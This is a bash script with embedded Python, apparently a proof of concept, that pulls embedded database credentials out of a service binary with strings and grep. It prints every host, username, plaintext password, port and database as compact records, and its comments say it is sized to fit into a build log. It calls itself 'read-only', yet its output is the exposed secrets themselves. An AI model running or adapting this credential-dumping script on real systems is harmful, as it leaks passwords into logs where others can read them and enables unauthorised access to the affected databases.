#!/usr/bin/env bash
# Print the COMPLETE embedded credential config RAW, one record per line.
# Compact form keeps it under the build-log size cap.
# READ-ONLY. No database/service connection is attempted.
set +e
B="YEXTPOC7731"; echo "$B-BEGIN"

strings -n 3 /scripts/bin/cbdservice 2>/dev/null \
 | grep -aE '^ *[a-z0-9_.-]+: *$|^ *(host|username|password|port|database|dbname|user|schema): ' \
 > /tmp/cfg.txt

python3 - <<'PY'
import re
svc=None; cur={}; recs=[]; orphan=[]
for ln in open('/tmp/cfg.txt',errors='replace'):
    s=ln.rstrip('\n')
    m=re.match(r'^\s*([a-z0-9_.-]+):\s*$',s)
    if m:
        if cur.get('password') or cur.get('host'): recs.append((svc,dict(cur)))
        svc=m.group(1); cur={}
        continue
    m=re.match(r'^\s*(host|username|user|password|port|database|dbname|schema):\s*(.*)$',s)
    if m:
        k,v=m.group(1),m.group(2).strip().strip('"')
        if k in cur and (cur.get('password') or cur.get('host')):
            recs.append((svc,dict(cur))); cur={}
        cur[k]=v
if cur.get('password') or cur.get('host'): recs.append((svc,dict(cur)))

withpw=[(s,d) for s,d in recs if d.get('password')]
print(f"TOTAL_RECORDS={len(recs)}  WITH_PASSWORD={len(withpw)}")
print("FORMAT: service | host | username | password | port | database")
print("-"*110)
seen=set()
for s,d in withpw:
    key=(s,d.get('host'),d.get('username') or d.get('user'),d.get('password'))
    if key in seen: continue
    seen.add(key)
    print(f"{s or '?'} | {d.get('host','?')} | {d.get('username') or d.get('user') or '?'} | {d.get('password')} | {d.get('port','')} | {d.get('database') or d.get('dbname','')}")
print("-"*110)
print(f"UNIQUE_CREDENTIAL_RECORDS={len(seen)}")
pw=sorted({d['password'] for _,d in withpw})
print(f"DISTINCT_PASSWORD_VALUES={len(pw)}")
PY
echo "$B-END"; exit 0
